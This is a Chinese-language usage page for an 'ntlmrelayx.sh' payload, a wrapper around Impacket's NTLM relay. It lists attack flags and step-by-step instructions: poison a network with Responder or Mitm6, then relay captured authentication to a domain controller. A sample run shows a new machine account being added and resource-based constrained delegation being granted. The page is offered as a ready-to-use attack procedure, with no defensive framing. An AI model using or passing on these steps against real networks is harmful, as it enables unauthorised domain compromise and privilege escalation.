## 📦 载荷使用说明：ntlmrelayx.sh

### 📝 功能说明
Impacket 工具集中的核心组件，用于接收被劫持的 NTLM 认证请求，并将其跨协议（如 SMB、HTTP、LDAP）中继到其他目标服务器，执行未授权操作。

### ⚙️ 参数说明
```text
- `-t`：中继的目标服务器（如 `ldap://dc.contoso.com`）
- `-smb2support`：启用 SMBv2 支持
- `--delegate-access`：尝试配置资源基于约束的委派（RBCD）
- `-i`：开启交互式 Shell（如果中继到 SMB 且具有管理员权限）
```

### 🚀 操作步骤
1. 确定要中继的目标服务器（通常是域控或重要业务服务器）。
2. 启动 Responder 或 Mitm6 等工具开始毒化网络并捕获认证请求。
3. 修改脚本中的中继目标。
4. 执行脚本：`bash ntlmrelayx.sh`，等待认证请求到来并执行中继攻击。

### 💻 执行样例
```bash
# 将捕获的请求中继到 192.168.1.10 的 LDAP 服务
./ntlmrelayx.sh -t ldap://192.168.1.10 --delegate-access

# 预期输出：
# [*] Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
# [*] Protocol Client LDAP loaded..
# [*] Protocol Client LDAPS loaded..
# [*] Protocol Client SMB loaded..
# [*] Running in relay mode to single host
# [*] Setting up SMB Server
# [*] Setting up HTTP Server
# [*] Servers started, waiting for connections
# [*] SMBD-Thread-3: Connection from 192.168.1.20 controlled, attacking target ldap://192.168.1.10
# [*] Authenticating against ldap://192.168.1.10 as CONTOSO\PC01$ SUCCEED
# [*] Enumerating relayed user's privileges. This may take a while on large domains
# [+] Relayed user CONTOSO\PC01$ has Write property privileges over target PC01$
# [+] Adding new computer with name: ZTDKQW$
# [+] Computer ZTDKQW$ added with password: Password123!
# [+] Modifying msDS-AllowedToActOnBehalfOfOtherIdentity on PC01$
# [+] Delegation access granted!
```
